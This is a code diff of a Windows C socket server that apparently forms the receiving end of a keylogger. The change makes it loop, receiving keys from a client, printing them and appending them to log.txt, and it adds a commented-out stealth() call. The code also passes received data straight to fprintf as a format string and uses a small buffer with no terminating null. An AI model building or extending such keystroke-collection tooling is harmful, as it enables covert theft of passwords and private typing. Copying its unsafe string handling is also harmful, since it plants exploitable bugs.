@@ -1,10 +1,10 @@
-#include <winsock2.h>
-#include "debug.h"
+#include "funcs.h"
 #pragma comment (lib, "ws2_32.lib") //Winsock Library
 //flag -lws2_32
 
 int main(int argc , char *argv[])
 {
+    // stealth();
     //Variables
     WSADATA data;
     SOCKET listen_sock, new_sock;
@@ -14,9 +14,8 @@ int main(int argc , char *argv[])
 
     //Get and check argv
     int doDebug = 0;
-    const char* true = "true";
     if(argc != 2) debug(1, 0, "[-]Too many or too short argumets! (server.exe [<boolean> debug])", -1);
-    if(strcmp(argv[1], true) == 0) doDebug = 1;
+    if(strcmp(argv[1], "true") == 0) doDebug = 1;
 
     //Initialize Winsock
     if (WSAStartup(MAKEWORD(2,2),&data) != 0)
@@ -58,23 +57,35 @@ int main(int argc , char *argv[])
     debug(doDebug, 0, "[-]Error in closesocket().", WSAGetLastError());
     else debug(doDebug, 1, "[+]Listening socket closed succesfully.\n", 0);
 
-    //TODO
-    char buf[100];
+    //Receive keys from client
+    char buf[20];
+    FILE* log = fopen("log.txt", "a+");
+    memset(buf, 0, sizeof(buf));
 
-    if(recv(new_sock, buf, sizeof(buf), 0) == SOCKET_ERROR)
-    debug(doDebug, 0, "[-]Error in recv().", WSAGetLastError());
-    else debug(doDebug, 1, "[+]Data received succesfully from the client.\n", 0);
-    printf("buf = %s\n", buf);
-    
+    while(1)
+    {
+        if(recv(new_sock, buf, sizeof(buf), 0) == SOCKET_ERROR)
+        {
+            printf("\n[-]Client disconnected.\n");
+            break;
+        }
+        fprintf(log, buf);
+        printf("client> %s\n", buf);
+        memset(buf, 0, sizeof(buf));
+    }
+    fclose(log);
+
     //Close the new socket
     if(closesocket(new_sock) == INVALID_SOCKET)
     debug(doDebug, 0, "[-]Error in closesocket().", WSAGetLastError());
     else debug(doDebug, 1, "[+]Socket closed succesfully.\n", 0);
 
-    //Close and cleanup WinSock
+    //Cleanup WinSock
     if(WSACleanup() == SOCKET_ERROR)
     debug(doDebug, 0, "[-]Error in WSACleanup().", WSAGetLastError());
     else debug(doDebug, 1, "[+]Winsock cleanup was succesful.\n", 0);
+
+    debug(doDebug, 1, "\nA full list of the keys was written in logs.txt.\n", 0);
 
     return 0;
 }
